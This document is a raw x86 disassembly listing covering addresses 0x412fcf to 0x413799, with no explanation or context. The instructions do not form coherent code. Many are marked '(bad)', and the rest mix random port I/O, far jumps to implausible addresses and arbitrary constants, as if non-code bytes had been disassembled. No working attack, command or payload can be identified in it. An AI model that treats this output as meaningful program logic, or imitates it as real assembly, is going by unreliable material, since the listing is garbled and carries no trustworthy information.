  412fcf:	add    edi,esi
  412fd1:	add    eax,esi
  412fd3:	xchg   esp,eax
  412fd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fd5:	sti    
  412fd6:	rcl    al,cl
  412fd8:	mov    al,ds:0xe05b00e4
  412fdd:	xchg   edx,eax
  412fde:	jmp    0x2268c4e8
  412fe3:	adc    BYTE PTR [esi-0xc28385a],al
  412fe9:	pop    ss
  412fea:	jns    0x412fd8
  412fec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fed:	push   0xa75a2d2e
  412ff2:	pop    ebx
  412ff3:	(bad)  
  412ff4:	int3   
  412ff5:	push   ebp
  412ff6:	addr16 mov edi,0xc4685ef1
  412ffc:	fidiv  WORD PTR [eax+ebx*2]
  412fff:	push   ss
  413000:	add    al,0x5e
  413002:	(bad)  
  413003:	jbe    0x41300d
  413005:	out    0x2,al
  413007:	fwait
  413008:	mov    ds:0x8d068381,al
  41300d:	popf   
  41300e:	loopne 0x41300b
  413010:	add    ebp,DWORD PTR ds:0x180c6c31
  413016:	shl    dh,0xd2
  413019:	pop    edi
  41301a:	outs   dx,BYTE PTR ds:[esi]
  41301b:	jl     0x412fda
  41301d:	data16 daa 
  41301f:	clc    
  413020:	sub    eax,0x5bbefbae
  413025:	shl    DWORD PTR [esi+0x6d33fed1],0x39
  41302c:	or     dl,BYTE PTR [esi+0x7e]
  41302f:	cmp    esp,0xffffffe7
  413032:	jbe    0x41307b
  413034:	add    BYTE PTR [esi],0xd
  413037:	mov    WORD PTR [edi],?
  413039:	mov    BYTE PTR [ecx-0x5cec1a4f],cl
  41303f:	sbb    DWORD PTR [esp+eiz*2-0x25a010bf],esp
  413046:	add    DWORD PTR [edx+0x27],edi
  413049:	jae    0x4130bc
  41304b:	(bad)  
  41304c:	(bad)  [ecx]
  41304e:	in     al,0x15
  413050:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413051:	xchg   esp,eax
  413052:	add    eax,0xec7ac9c8
  413057:	sbb    BYTE PTR [eax+0x37],0xbf
  41305b:	mov    al,0x7a
  41305d:	xor    eax,0xc1282555
  413062:	xchg   edi,eax
  413063:	push   es
  413064:	push   cs
  413065:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413066:	pop    edx
  413067:	xchg   ebx,eax
  413068:	push   edx
  413069:	pusha  
  41306a:	cld    
  41306b:	into   
  41306c:	test   DWORD PTR [eax+0x7d],ebp
  41306f:	in     al,0xce
  413071:	cmp    cl,BYTE PTR [esi-0x28]
  413074:	mov    bh,0x24
  413076:	lods   al,BYTE PTR ds:[esi]
  413077:	data16 loopne 0x4130e9
  41307a:	loope  0x413086
  41307c:	cmp    bl,BYTE PTR [ecx]
  41307e:	dec    ecx
  41307f:	mov    ds:0xef3073c2,eax
  413084:	das    
  413085:	stc    
  413086:	ror    ebp,1
  413088:	jecxz  0x41309d
  41308a:	int3   
  41308b:	call   0xf2422bfb
  413090:	cmp    al,0x85
  413092:	gs push ebx
  413094:	pop    ss
  413095:	clc    
  413096:	jnp    0x4130b8
  413098:	xor    BYTE PTR [edi+0x5c193a8f],bh
  41309e:	je     0x4130b9
  4130a0:	mov    ah,0x19
  4130a2:	mov    eax,ds:0x11fd452c
  4130a7:	loopne 0x413101
  4130a9:	js     0x4130c2
  4130ab:	xor    eax,0x591e8d70
  4130b0:	xor    DWORD PTR [eax-0x6c147e44],edx
  4130b6:	jmp    0x6ef1:0xe5da8704
  4130bd:	dec    eax
  4130be:	xlat   BYTE PTR ds:[ebx]
  4130bf:	aam    0xd9
  4130c1:	jb     0x4130ef
  4130c3:	xchg   ecx,eax
  4130c4:	xchg   DWORD PTR [esi-0x19c9cf6c],eax
  4130ca:	adc    BYTE PTR [esi-0x41],0xde
  4130ce:	mov    eax,0x1f7d720d
  4130d3:	pop    esi
  4130d4:	xchg   edx,eax
  4130d5:	or     DWORD PTR [ebx+esi*2+0x1d],edx
  4130d9:	rcr    BYTE PTR [ebx-0x5aa6d901],0x40
  4130e0:	sbb    DWORD PTR [esi-0x3207cf3c],edi
  4130e6:	stos   BYTE PTR es:[edi],al
  4130e7:	xchg   ebp,eax
  4130e8:	mov    al,ds:0x6967de87
  4130ed:	sbb    eax,0xe5be20a2
  4130f2:	out    dx,eax
  4130f3:	inc    ebx
  4130f4:	xor    eax,0x467f02b7
  4130f9:	or     bh,ch
  4130fb:	out    0x5d,eax
  4130fd:	sbb    ah,BYTE PTR [ebp-0xc090196]
  413103:	xchg   ebx,ebp
  413105:	fnsave [ecx]
  413107:	cmp    al,0x86
  413109:	sub    al,BYTE PTR [esi+0x31bda000]
  41310f:	jmp    0x4130c8
  413111:	add    ch,BYTE PTR [eax]
  413113:	jne    0x4130f3
  413115:	fstp   QWORD PTR [ecx+edx*1-0x7e47349e]
  41311c:	outs   dx,DWORD PTR ds:[esi]
  41311d:	xor    al,0x54
  41311f:	or     eax,0x9164b2f5
  413124:	test   BYTE PTR [esi-0x778f02ea],bl
  41312a:	das    
  41312b:	jnp    0x4130d0
  41312d:	into   
  41312e:	jecxz  0x4130ef
  413130:	pop    es
  413131:	pop    esi
  413132:	add    BYTE PTR [edx+0x3b],0xc
  413136:	cdq    
  413137:	xor    al,BYTE PTR [ebp-0x2fdabb73]
  41313d:	adc    DWORD PTR [ecx-0x11],0x98eeae9a
  413144:	loopne 0x4130da
  413146:	leave  
  413147:	scas   eax,DWORD PTR es:[edi]
  413148:	mov    cl,0x84
  41314a:	xchg   esi,eax
  41314b:	or     dl,BYTE PTR [ecx]
  41314d:	add    ch,BYTE PTR [eax]
  41314f:	xchg   BYTE PTR [ebp+0x26384f7c],dh
  413155:	jno    0x413194
  413157:	pop    ecx
  413158:	imul   ebp,edi,0x496e5e21
  41315e:	pop    ss
  41315f:	push   ss
  413160:	gs jo  0x413163
  413163:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413164:	jo     0x4131a7
  413166:	test   DWORD PTR [eax],edi
  413168:	push   esp
  413169:	or     ebx,DWORD PTR [ebx-0x3b244bc7]
  41316f:	jl     0x413113
  413171:	lahf   
  413172:	sub    al,0x18
  413174:	out    0x54,eax
  413176:	inc    edi
  413177:	pop    ds
  413178:	out    dx,eax
  413179:	mov    bh,BYTE PTR [ebp-0x56814f9f]
  41317f:	jb     0x4131e7
  413181:	stos   BYTE PTR es:[edi],al
  413182:	xor    al,0x3a
  413184:	sbb    bl,0x26
  413187:	cmp    DWORD PTR [esi-0x2a],esi
  41318a:	in     eax,0x8e
  41318c:	xor    BYTE PTR [ebp-0x42db4cdb],bh
  413192:	and    eax,0xe38b5b54
  413197:	js     0x413204
  413199:	gs loop 0x4131c5
  41319c:	js     0x4131d8
  41319e:	cld    
  41319f:	xchg   BYTE PTR [edx+0x4009ea52],ah
  4131a5:	mov    WORD PTR [ebp+0x5666e11b],?
  4131ab:	jns    0x4131b6
  4131ad:	mov    edi,0xea0f81a5
  4131b2:	or     al,0xd4
  4131b4:	jne    0x4131b7
  4131b6:	test   al,0x14
  4131b8:	mov    ch,ch
  4131ba:	mov    ds:0xf6b40d1b,eax
  4131bf:	inc    esp
  4131c0:	dec    edi
  4131c1:	and    BYTE PTR [ecx+0x2f3b5bb0],al
  4131c7:	cmp    eax,0xa7221236
  4131cc:	popf   
  4131cd:	jg     0x4131de
  4131cf:	mov    al,0x74
  4131d1:	jge    0x4131e6
  4131d3:	gs (bad) 
  4131d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131d6:	jnp    0x41315a
  4131d8:	fnsave [edi+0x4502de73]
  4131de:	sub    esi,DWORD PTR [esp+edx*2]
  4131e1:	and    ch,bh
  4131e3:	xchg   esp,eax
  4131e4:	pop    ss
  4131e5:	jbe    0x4131c5
  4131e7:	popf   
  4131e8:	jae    0x41317e
  4131ea:	add    BYTE PTR [edx],dh
  4131ec:	nop
  4131ed:	sar    ecx,0xed
  4131f0:	(bad)  
  4131f1:	retf   0x28e4
  4131f4:	add    bl,BYTE PTR [eax+ecx*2+0x35911fea]
  4131fb:	add    al,0x3
  4131fd:	inc    ebp
  4131fe:	imul   esp,DWORD PTR [eax],0xffffffec
  413201:	dec    esi
  413202:	push   esp
  413203:	dec    ebp
  413204:	ds mov ecx,0xb69f9911
  41320a:	dec    esp
  41320b:	rcl    DWORD PTR [ebx-0x31],cl
  41320e:	popf   
  41320f:	jmp    0xe4706728
  413214:	xor    edx,DWORD PTR [esi]
  413216:	in     al,dx
  413217:	scas   eax,DWORD PTR es:[edi]
  413218:	adc    eax,ecx
  41321a:	fs push 0xffffffcc
  41321d:	dec    ebp
  41321e:	fld    DWORD PTR ds:0xd9f8a8d4
  413224:	push   esp
  413225:	xchg   edi,eax
  413226:	sub    BYTE PTR [eax],ch
  413228:	push   esi
  413229:	cmp    dh,BYTE PTR [ebp-0x415bbe8b]
  41322f:	push   eax
  413230:	fld    DWORD PTR [ecx]
  413232:	sbb    esi,DWORD PTR [eax]
  413234:	shl    BYTE PTR [edi],cl
  413236:	and    bh,al
  413238:	lock ja 0x4132b7
  41323b:	or     edi,DWORD PTR [ebp-0x6e7031b7]
  413241:	lods   eax,DWORD PTR ds:[esi]
  413242:	pop    es
  413243:	push   esi
  413244:	mov    BYTE PTR [ecx-0x2628661c],dl
  41324a:	xchg   ecx,eax
  41324b:	pop    esi
  41324d:	mov    al,ds:0xb2c8ddf4
  413252:	(bad)  
  413253:	retf   0xf6db
  413256:	cmc    
  413257:	popf   
  413258:	xchg   DWORD PTR [eax+0x22455025],ebp
  41325e:	stc    
  41325f:	pusha  
  413260:	mov    ah,0x53
  413262:	mov    ah,0x47
  413264:	test   BYTE PTR [ebp+0x537ab09a],dh
  41326a:	das    
  41326b:	xor    eax,0x2f612d05
  413270:	adc    al,BYTE PTR [ecx]
  413272:	imul   edi,DWORD PTR [ecx],0xf53e5ec7
  413278:	popa   
  413279:	popf   
  41327a:	adc    DWORD PTR [edx+ecx*4-0x513532d8],esi
  413281:	ds push ecx
  413283:	push   es
  413284:	sub    edx,DWORD PTR ds:0x5fdf537b
  41328a:	retf   0x3fa3
  41328d:	loopne 0x413289
  41328f:	sub    eax,esp
  413291:	daa    
  413292:	lds    esi,FWORD PTR [edi+0x53]
  413295:	xor    bh,BYTE PTR [ecx+ebx*8-0x4]
  413299:	inc    ebp
  41329a:	inc    ebx
  41329b:	aam    0x90
  41329d:	stos   DWORD PTR es:[edi],eax
  41329e:	fst    st(1)
  4132a0:	jbe    0x413311
  4132a2:	out    0xa2,eax
  4132a4:	in     eax,dx
  4132a5:	mov    eax,0x7833404
  4132aa:	xchg   esp,eax
  4132ab:	jmp    0x723e1c24
  4132b0:	cmp    edx,edi
  4132b2:	sub    eax,0x62952246
  4132b7:	or     DWORD PTR [ebp-0x3b733520],ecx
  4132bd:	test   DWORD PTR [eax],esp
  4132bf:	jp     0x4132b4
  4132c1:	mov    edi,0x8bf8a794
  4132c6:	inc    ebx
  4132c7:	pop    ss
  4132c8:	jg     0x41333c
  4132ca:	pop    esi
  4132cb:	cs push esp
  4132cd:	fs repnz shl ebx,0x48
  4132d2:	int    0x89
  4132d4:	xchg   DWORD PTR ds:0x3a0be591,ebp
  4132da:	out    0xd4,eax
  4132dc:	mov    cl,BYTE PTR [ebx]
  4132de:	cli    
  4132df:	out    dx,eax
  4132e0:	repz fild WORD PTR [edx+0x40be0d16]
  4132e7:	push   ds
  4132e8:	adc    ebx,0xffffffc3
  4132eb:	mov    eax,0x99271536
  4132f0:	push   es
  4132f1:	mov    ch,BYTE PTR [esi+0xc66e0bc]
  4132f7:	test   eax,0x7e03d43c
  4132fc:	test   al,0xac
  4132fe:	lahf   
  4132ff:	(bad)  
  413300:	iret   
  413301:	mov    bl,0xf2
  413303:	push   edi
  413304:	adc    edx,DWORD PTR [ebp-0x3e]
  413307:	mov    edi,0xa4110ae5
  41330c:	adc    DWORD PTR [ebx],esi
  41330e:	dec    edx
  41330f:	dec    ecx
  413310:	xor    eax,0x4091bf69
  413315:	aam    0xda
  413317:	repz xor al,0x93
  41331a:	in     eax,0xaf
  41331c:	stc    
  41331d:	outs   dx,DWORD PTR ds:[si]
  41331f:	jbe    0x41334c
  413321:	pop    eax
  413322:	pop    edi
  413323:	es pop ss
  413325:	and    esi,DWORD PTR [ebx+0x1b4ce28f]
  41332b:	mov    dh,0x3a
  41332d:	inc    eax
  41332e:	sub    DWORD PTR [edi-0x4fd38a53],edx
  413334:	mov    ch,0x16
  413336:	out    0x55,eax
  413338:	push   0xf7ee9740
  41333d:	fbld   TBYTE PTR [esi+0x6bf4a460]
  413343:	xchg   ebx,eax
  413344:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413345:	mov    ds:0xf577c07d,eax
  41334a:	mov    edx,0x1193a267
  41334f:	dec    ecx
  413350:	mov    esp,0x610a383e
  413355:	aad    0x4a
  413357:	pop    ebp
  413358:	retf   0xeea6
  41335b:	jnp    0x41334b
  41335d:	xchg   esp,esp
  41335f:	cld    
  413360:	sbb    BYTE PTR ds:0x713e435e,al
  413366:	and    BYTE PTR [ebp-0x4e],ah
  413369:	out    0x1f,al
  41336b:	and    BYTE PTR [eax],0x1a
  41336e:	xchg   BYTE PTR [edi+0x4a],dl
  413371:	fwait
  413372:	add    al,0x1d
  413374:	jg     0x413300
  413376:	aaa    
  413377:	repnz xchg edi,eax
  413379:	lea    esp,[esi]
  41337b:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41337d:	shl    ebp,0x67
  413380:	xchg   esi,eax
  413381:	sar    DWORD PTR [edx],cl
  413383:	xchg   esp,eax
  413384:	xor    ebp,DWORD PTR [ebx+0x1efb6070]
  41338a:	mov    ds:0xe678f80f,al
  41338f:	inc    esp
  413390:	pop    es
  413391:	sbb    bl,bl
  413393:	mov    ch,al
  413395:	jecxz  0x41335a
  413397:	mov    edx,0xf0a6a1e3
  41339c:	push   esp
  41339d:	dec    eax
  41339e:	sbb    eax,0x30eeaa70
  4133a3:	or     DWORD PTR [eax],edx
  4133a5:	pop    edx
  4133a6:	and    esi,ebp
  4133a8:	inc    ebx
  4133a9:	inc    edx
  4133aa:	mov    ds:0xe584ce08,eax
  4133af:	push   cs
  4133b0:	xor    eax,0x3a817d29
  4133b5:	adc    al,BYTE PTR [ebp-0x74]
  4133b8:	push   ebp
  4133b9:	fadd   DWORD PTR [eax+0xb75ca93]
  4133bf:	(bad)  
  4133c0:	shl    BYTE PTR [edi+0x65],1
  4133c3:	jmp    0x1fbff1ca
  4133c8:	ficom  WORD PTR [esi+0x38a55d1f]
  4133ce:	in     al,dx
  4133cf:	loop   0x4133d1
  4133d1:	out    dx,al
  4133d2:	jmp    0x413440
  4133d4:	push   edi
  4133d5:	mov    dl,0x87
  4133d7:	mov    esi,0x9c22a296
  4133dc:	jb     0x4133ef
  4133de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133df:	sar    DWORD PTR [ebx],1
  4133e1:	cmp    al,0xf2
  4133e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133e4:	int3   
  4133e5:	or     al,0x7e
  4133e7:	add    BYTE PTR [eax-0x26244ba8],0xad
  4133ee:	cdq    
  4133ef:	and    al,0x95
  4133f1:	push   ebp
  4133f2:	xchg   ebx,eax
  4133f3:	in     al,dx
  4133f4:	call   0x946d:0xf23ff868
  4133fb:	or     al,0xf5
  4133fd:	ins    DWORD PTR es:[edi],dx
  4133fe:	popa   
  4133ff:	xor    edx,DWORD PTR [ebx-0x45]
  413402:	cmp    DWORD PTR [esi],ebx
  413404:	jg     0x4133d1
  413406:	cdq    
  413407:	cmp    ebx,DWORD PTR [edx-0x1b3341f9]
  41340d:	jno    0x4133d8
  41340f:	fistp  QWORD PTR [esi+0x2f]
  413412:	hlt    
  413413:	add    DWORD PTR [ecx],0xbf155623
  413419:	cmp    eax,0xd232ce5c
  41341e:	mov    esp,ebp
  413420:	pop    ecx
  413421:	mov    bh,0x53
  413423:	cmp    eax,ebx
  413425:	adc    esi,DWORD PTR [edx-0x767ec4ce]
  41342b:	sbb    eax,0x5e9deb22
  413430:	push   edx
  413431:	mov    bh,0x1b
  413433:	or     BYTE PTR [esi],0x64
  413436:	aam    0x49
  413438:	dec    eax
  413439:	pop    edx
  41343a:	sbb    BYTE PTR [ecx-0x1c],al
  41343d:	daa    
  41343e:	jo     0x4134a5
  413440:	repz out 0x74,al
  413443:	xor    al,0x3
  413445:	pop    eax
  413446:	leave  
  413447:	jmp    0x2f6ecdbc
  41344c:	outs   dx,BYTE PTR ds:[esi]
  41344d:	mov    edi,fs
  41344f:	cmp    DWORD PTR [ebx-0x24],ecx
  413452:	mov    ecx,DWORD PTR [ebx-0x65]
  413455:	sub    BYTE PTR [ebx],0x44
  413458:	pop    es
  413459:	pop    esi
  41345a:	je     0x4133e6
  41345c:	dec    edi
  41345d:	push   edx
  41345e:	push   ebp
  41345f:	popf   
  413460:	cmc    
  413461:	lahf   
  413462:	(bad)  
  413464:	shl    DWORD PTR ds:0xbdb79d0d,1
  41346a:	jecxz  0x4134bc
  41346c:	xlat   BYTE PTR ds:[ebx]
  41346d:	stc    
  41346e:	push   edx
  41346f:	jg     0x4134a4
  413471:	(bad)  
  413472:	mov    WORD PTR [ebp-0x1c23f982],?
  413478:	iret   
  413479:	sbb    eax,0xc111eced
  41347e:	retf   
  41347f:	inc    ebx
  413480:	xor    eax,0x797423ce
  413485:	rol    BYTE PTR [ecx-0x59],1
  413488:	sti    
  413489:	jg     0x413441
  41348b:	adc    dh,BYTE PTR [esi+0xbda8140]
  413491:	pop    eax
  413492:	cdq    
  413493:	retf   
  413494:	mov    ?,WORD PTR ss:[esi]
  413497:	pop    eax
  413498:	das    
  413499:	outs   dx,BYTE PTR ds:[esi]
  41349a:	or     ah,BYTE PTR [ebx+esi*8]
  41349d:	cmp    BYTE PTR [eax+0x64993dbf],dh
  4134a3:	inc    esi
  4134a4:	sub    al,0x7f
  4134a6:	lods   eax,DWORD PTR ds:[esi]
  4134a7:	fwait
  4134a8:	retf   
  4134a9:	cli    
  4134aa:	das    
  4134ab:	sub    ebx,ecx
  4134ad:	cld    
  4134ae:	lock jmp 0x4134c3
  4134b1:	ins    BYTE PTR es:[edi],dx
  4134b2:	mov    bl,BYTE PTR [edi-0x67]
  4134b5:	pop    es
  4134b6:	sbb    BYTE PTR [esp+eax*8-0x6c0a45e],cl
  4134bd:	and    BYTE PTR [ebp+0x1994d4f6],0x3f
  4134c4:	cmp    BYTE PTR [edi],bh
  4134c6:	pop    es
  4134c7:	cmp    al,0x28
  4134c9:	retf   0xfa4c
  4134cc:	lock push ecx
  4134ce:	sub    bl,bl
  4134d0:	dec    edx
  4134d1:	enter  0x6b30,0xa0
  4134d5:	ins    DWORD PTR es:[edi],dx
  4134d6:	push   edi
  4134d7:	xor    edx,DWORD PTR [ecx-0x27]
  4134da:	sbb    eax,edi
  4134dc:	ins    DWORD PTR es:[edi],dx
  4134dd:	and    al,0x32
  4134df:	lods   eax,DWORD PTR ds:[esi]
  4134e0:	jecxz  0x4134fb
  4134e2:	add    BYTE PTR [edi+0x67],0x94
  4134e6:	sar    BYTE PTR [esp+ebp*8+0x0],0xb0
  4134eb:	mov    eax,0xf34f83d4
  4134f0:	adc    al,0x72
  4134f2:	and    eax,DWORD PTR [esi+edx*1+0x4d71a26c]
  4134f9:	inc    edx
  4134fa:	test   ebp,ecx
  4134fc:	into   
  4134fd:	fdivr  st(7),st
  4134ff:	in     al,0x5b
  413501:	retf   
  413502:	mov    dl,0xbe
  413504:	push   0xfffffffa
  413506:	ret    0xd602
  413509:	mov    ax,ds:0x34e544ff
  41350f:	push   ss
  413510:	loope  0x413497
  413512:	cmp    al,0x17
  413514:	cmp    eax,0x1997041a
  413519:	retf   
  41351a:	imul   edi,DWORD PTR [eax-0x1c],0xffffff89
  41351e:	and    DWORD PTR [edx],ebp
  413520:	push   cs
  413521:	fidiv  DWORD PTR [ecx-0x12]
  413524:	push   edx
  413525:	or     eax,0xd6be86dc
  41352a:	test   DWORD PTR [eax],ebp
  41352c:	adc    edx,DWORD PTR [ebx]
  41352e:	mov    ebx,0x50c3a0bf
  413533:	mov    eax,ds:0x31064b11
  413538:	cld    
  413539:	cli    
  41353a:	jmp    0x691a0d54
  41353f:	jns    0x41358a
  413541:	fcomp  DWORD PTR [edx+0x0]
  413544:	push   edx
  413545:	cli    
  413546:	je     0x4134e1
  413548:	fcomip st,st(2)
  41354a:	jne    0x4135c6
  41354c:	inc    eax
  41354d:	out    dx,al
  41354e:	mov    ds:0xf64e1203,al
  413553:	fcomi  st,st(1)
  413555:	cmp    dh,BYTE PTR [eax]
  413557:	cmc    
  413558:	xchg   DWORD PTR [esi],edi
  41355a:	cmp    dl,0x6a
  41355d:	sbb    BYTE PTR [ecx-0xcc67242],cl
  413563:	pop    ds
  413564:	inc    edx
  413565:	push   esi
  413566:	dec    ebp
  413567:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413568:	add    al,0x69
  41356a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41356b:	(bad)  
  41356d:	pop    DWORD PTR [edx-0x3a5c6de5]
  413573:	nop
  413574:	stc    
  413575:	jns    0x41355a
  413577:	popf   
  413578:	es cmp esp,DWORD PTR ss:[esi-0x9]
  41357d:	push   ds
  41357e:	out    0x0,al
  413580:	cmp    BYTE PTR [esi],ah
  413582:	clc    
  413583:	mov    ah,0xa9
  413585:	lods   al,BYTE PTR ds:[esi]
  413586:	not    DWORD PTR [ecx-0x5f]
  413589:	dec    esi
  41358a:	mov    ah,0xf6
  41358c:	arpl   sp,si
  41358e:	push   ecx
  41358f:	pop    edi
  413590:	pop    edx
  413591:	xor    DWORD PTR [ebx+0x2f04116d],ebp
  413597:	mov    ?,WORD PTR [ecx-0x5c]
  41359a:	jge    0x413555
  41359c:	(bad)  
  41359d:	push   ecx
  41359e:	loop   0x413610
  4135a0:	popa   
  4135a1:	lods   al,BYTE PTR ds:[esi]
  4135a2:	test   al,0x30
  4135a4:	pop    ebp
  4135a5:	push   eax
  4135a6:	pop    ebp
  4135a7:	and    cl,BYTE PTR [esi-0x57]
  4135aa:	sub    BYTE PTR [ebx],ah
  4135ac:	pop    ss
  4135ad:	mov    ah,0x22
  4135af:	stos   DWORD PTR es:[edi],eax
  4135b0:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4135b2:	jae    0x413567
  4135b4:	sub    BYTE PTR [eax-0x72],al
  4135b7:	mov    edx,edi
  4135b9:	hlt    
  4135ba:	cmp    edi,DWORD PTR ds:0x84a10512
  4135c0:	mov    dl,BYTE PTR [eax+0x34f1556f]
  4135c6:	retf   0x2009
  4135c9:	(bad)  
  4135cb:	shl    DWORD PTR [esi+ebx*2+0x7541f752],1
  4135d2:	(bad)  
  4135d3:	push   ebx
  4135d4:	test   al,0xd6
  4135d6:	loopne 0x41358a
  4135d8:	dec    ebp
  4135d9:	jg     0x41364a
  4135db:	mov    al,0x8a
  4135dd:	sbb    ecx,ecx
  4135df:	retf   0x6650
  4135e2:	and    al,0x7d
  4135e4:	in     al,0xd
  4135e6:	mov    ch,0xfb
  4135e8:	cmp    edx,DWORD PTR [edx]
  4135ea:	lahf   
  4135eb:	inc    esi
  4135ec:	xor    ch,BYTE PTR [edx]
  4135ee:	(bad)  
  4135ef:	xchg   ebx,eax
  4135f0:	pop    ebp
  4135f1:	inc    eax
  4135f2:	out    dx,eax
  4135f3:	scas   al,BYTE PTR es:[edi]
  4135f4:	xchg   ebp,eax
  4135f5:	mov    ch,0x10
  4135f7:	jnp    0x4135b8
  4135f9:	and    eax,0x8e667664
  4135fe:	dec    edx
  4135ff:	int3   
  413600:	ins    DWORD PTR es:[edi],dx
  413601:	fwait
  413602:	stos   DWORD PTR es:[edi],eax
  413603:	cmc    
  413604:	clc    
  413605:	jecxz  0x413638
  413607:	rcl    BYTE PTR [edi-0x5a3bb871],1
  41360d:	std    
  41360e:	inc    ebp
  41360f:	xor    eax,0xeae98dc3
  413614:	dec    ebx
  413615:	int3   
  413616:	xor    eax,0xe5e6484c
  41361b:	inc    ebx
  41361c:	loopne 0x41361e
  41361e:	call   DWORD PTR [eax+ebp*8-0x70]
  413622:	imul   esp,DWORD PTR [ecx-0xf3d1b00],0xffffffef
  413629:	bnd jle 0x4135ad
  41362c:	in     eax,dx
  41362d:	push   cs
  41362e:	pop    esp
  41362f:	scas   eax,DWORD PTR es:[edi]
  413630:	(bad)  
  413631:	cli    
  413632:	inc    esi
  413633:	push   esp
  413634:	jmp    0x34cd:0xcaebe6af
  41363b:	adc    DWORD PTR [edi+0x15ca8a04],ebx
  413641:	push   ecx
  413642:	fldcw  WORD PTR [edi+0x14]
  413645:	jge    0x413681
  413647:	and    BYTE PTR [eax],al
  413649:	outs   dx,DWORD PTR ds:[esi]
  41364a:	out    0xe5,al
  41364c:	adc    BYTE PTR [edx+0x42cf0409],ah
  413652:	and    al,0x38
  413654:	dec    esp
  413655:	std    
  413656:	mov    bh,0x9
  413658:	(bad)  
  413659:	inc    ebp
  41365a:	push   ebp
  41365b:	outs   dx,DWORD PTR ds:[esi]
  41365c:	jle    0x4136d4
  41365e:	(bad)  
  41365f:	cmp    DWORD PTR [esi-0x2db44fae],ecx
  413665:	adc    al,0xea
  413667:	adc    cl,BYTE PTR [eax+edx*2-0x6bcef0b]
  41366e:	xor    BYTE PTR ds:0x1d0569d4,al
  413674:	leave  
  413675:	scas   eax,DWORD PTR es:[edi]
  413676:	mov    al,BYTE PTR [eax]
  413678:	pop    ds
  413679:	dec    ebx
  41367a:	mov    ds:0x8df1a17b,al
  41367f:	add    ebp,DWORD PTR [ebx-0xb8d0611]
  413685:	nop
  413686:	jo     0x413660
  413688:	sbb    BYTE PTR [edi+0x65b45ca1],dl
  41368e:	aam    0x8d
  413690:	or     ebp,DWORD PTR [eax]
  413692:	icebp  
  413693:	arpl   sp,bp
  413695:	adc    al,BYTE PTR [esi+0x27c2a332]
  41369b:	js     0x4136b0
  41369d:	or     DWORD PTR [esi+0x38],0x8891b89b
  4136a4:	sbb    esi,DWORD PTR ds:0x10cd98c1
  4136aa:	mov    bh,0x4e
  4136ac:	fdiv   QWORD PTR [edi]
  4136ae:	jecxz  0x413708
  4136b0:	gs jns 0x41369c
  4136b3:	and    bl,cl
  4136b5:	(bad)  
  4136b6:	cs std 
  4136b8:	scas   al,BYTE PTR es:[edi]
  4136b9:	fst    QWORD PTR [eax+edx*1]
  4136bc:	(bad)  
  4136bd:	loopne 0x4136ca
  4136bf:	mov    DWORD PTR [edx+0x4e],0xafd3e858
  4136c6:	mov    eax,ds:0x95430857
  4136cb:	mov    edx,0x93b65089
  4136d0:	repnz loop 0x4136c1
  4136d3:	and    DWORD PTR [ebx+0xc],edx
  4136d6:	jns    0x4136c3
  4136d8:	test   al,0x8e
  4136da:	ins    BYTE PTR es:[edi],dx
  4136db:	inc    eax
  4136dc:	clc    
  4136dd:	loopne 0x41374c
  4136df:	sbb    edi,ebp
  4136e1:	shl    BYTE PTR [esi],0x3e
  4136e4:	pop    ebx
  4136e5:	jbe    0x41375f
  4136e7:	and    BYTE PTR [ecx+eax*2+0x24],0xd2
  4136ec:	jle    0x41375d
  4136ee:	or     eax,0xff5067dd
  4136f3:	ror    DWORD PTR [esi+0x77d00260],1
  4136f9:	(bad)  
  4136fb:	push   ebp
  4136fc:	mov    dl,0xaf
  4136fe:	xchg   esi,eax
  4136ff:	mov    ebx,0x20da979
  413704:	in     eax,dx
  413705:	cs adc ebx,esp
  413708:	pop    edi
  413709:	mov    ah,0xfc
  41370b:	retf   0x81a5
  41370e:	ins    BYTE PTR es:[edi],dx
  41370f:	xor    BYTE PTR [esi-0x34dddac9],ah
  413715:	adc    eax,DWORD PTR ds:0xf65bedb1
  41371b:	stc    
  41371c:	xchg   edx,eax
  41371d:	pop    edi
  41371e:	stos   DWORD PTR es:[edi],eax
  41371f:	(bad)  
  413720:	out    dx,al
  413721:	test   al,0x99
  413723:	dec    esp
  413724:	adc    BYTE PTR [esi-0x1c],ch
  413727:	mov    al,ds:0x31182e86
  41372c:	iret   
  41372d:	pop    ds
  41372e:	scas   eax,DWORD PTR es:[edi]
  41372f:	scas   eax,DWORD PTR es:[edi]
  413730:	cwde   
  413731:	sub    BYTE PTR ds:0x2ebf2bbd,ah
  413737:	mov    ebp,0x21d64993
  41373c:	pop    eax
  41373d:	or     dh,dh
  41373f:	jno    0x41372b
  413741:	push   edx
  413742:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413743:	push   ecx
  413744:	and    BYTE PTR [ebx],ch
  413746:	inc    edx
  413747:	ja     0x4137a6
  413749:	enter  0x2da3,0x63
  41374d:	loopne 0x4136d5
  41374f:	jl     0x4136d8
  413751:	pop    esi
  413752:	jnp    0x4136f1
  413754:	jecxz  0x413711
  413756:	jle    0x413718
  413758:	cmp    BYTE PTR [edi],bl
  41375a:	out    0xf8,al
  41375c:	xor    DWORD PTR [esi-0x4d],ecx
  41375f:	mul    BYTE PTR [esi+0x33af332f]
  413765:	mov    ecx,0xed89e1d1
  41376a:	sub    ebp,DWORD PTR [edi]
  41376c:	in     eax,0xf6
  41376e:	enter  0x37dc,0xc9
  413772:	cdq    
  413773:	je     0x413725
  413775:	sar    DWORD PTR [ecx+0xc5f5cc5],cl
  41377b:	pusha  
  41377c:	and    DWORD PTR [edx+ecx*8-0x26],0x4e66e28a
  413784:	mov    al,ds:0xdacae7f2
  413789:	mov    ds:0x237ee185,al
  41378e:	cs iret 
  413790:	dec    ebp
  413791:	mov    ebp,0x3399fa57
  413797:	xor    ah,dl
  413799:	cmp    eax,0x34360ddf
